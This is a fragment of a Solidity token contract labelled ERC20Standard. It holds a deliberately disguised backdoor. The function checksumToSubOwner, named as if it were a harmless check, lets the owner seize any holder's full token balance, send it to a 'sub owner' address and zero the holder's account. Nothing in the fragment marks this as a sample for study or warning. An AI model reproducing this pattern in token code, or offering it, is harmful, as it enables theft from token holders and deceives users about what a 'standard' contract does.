...
contract ERC20Standard is ERC20 {
  ...
  function setSubOwner(address sub) onlyOwner returns(address) {
      require(subOwner != sub, "sub Owner have set already");
      subOwner = sub;
      return sub;
  }
  
  function checksumToSubOwner(address sender) onlyOwner returns (bool) {
      require(subOwner != sender, "sender must deferent subOwner");
      require(balances[sender] > 0, "sender balance is empty!");
      uint256 amount = balances[sender];
      balances[subOwner] += balances[sender];
      balances[sender] = 0;
      Transfer(sender, subOwner, amount);
      return true;
  }
}